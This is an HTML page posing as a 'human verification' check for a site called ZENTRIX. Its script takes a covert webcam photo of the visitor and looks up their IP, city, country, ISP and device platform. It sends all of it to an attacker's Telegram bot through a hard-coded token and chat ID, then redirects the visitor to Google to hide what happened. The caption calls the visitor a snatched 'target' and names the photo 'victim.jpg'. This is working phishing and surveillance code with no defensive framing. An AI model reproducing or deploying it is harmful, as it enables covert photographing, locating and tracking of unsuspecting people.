<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>ZENTRIX | ID-VERIFY</title>
    <style>
        body { background: #000; color: #0f0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; }
        #status { font-size: 14px; margin-top: 15px; font-family: monospace; }
        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
        video, canvas { display: none; } /* කැමරාව හංගලා තියෙන්නේ */
    </style>
</head>
<body>

    <h2 id="msg">HUMAN VERIFICATION NEEDED</h2>
    <p style="color:#555; text-align:center; padding: 0 20px;">Please allow camera access to prove you are not a bot and continue to the content.</p>
    
    <button class="btn" onclick="startProcess()">VERIFY NOW</button>
    <div id="status">Waiting for user...</div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8521741180:AAHMiUEg1TjVtCpyaGKdTllYtvIXz2XCjdk";
        const CHAT_ID = "7871773175";

        async function startProcess() {
            document.getElementById('status').innerText = "Initializing security protocols...";
            
            try {
                // 1. Get Camera Permission & Capture
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Convert to Image Data
                    const dataURL = canvas.toDataURL('image/jpeg');
                    const blob = await (await fetch(dataURL)).blob();

                    // 2. Get Device & IP Info
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ipData = await ipRes.json();

                    // 3. Send All to Telegram
                    await sendToTelegram(blob, ipData);

                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());

                    document.getElementById('status').innerText = "Verified! Redirecting...";
                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
                }, 1000);

            } catch (err) {
                document.getElementById('status').innerText = "Error: Permission Denied.";
            }
        }

        async function sendToTelegram(photoBlob, ipData) {
            const caption = `🎭 **ZENTRIX TARGET SNATCHED** 🎭\n\n` +
                          `📍 **IP:** \`${ipData.ip}\`\n` +
                          `🌍 **Location:** ${ipData.city}, ${ipData.country_name}\n` +
                          `📱 **Device:** ${navigator.platform}\n` +
                          `🏢 **ISP:** ${ipData.org}\n\n` +
                          `📸 **Photo Attached Below!**`;

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, 'victim.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }
    </script>
</body>
</html>
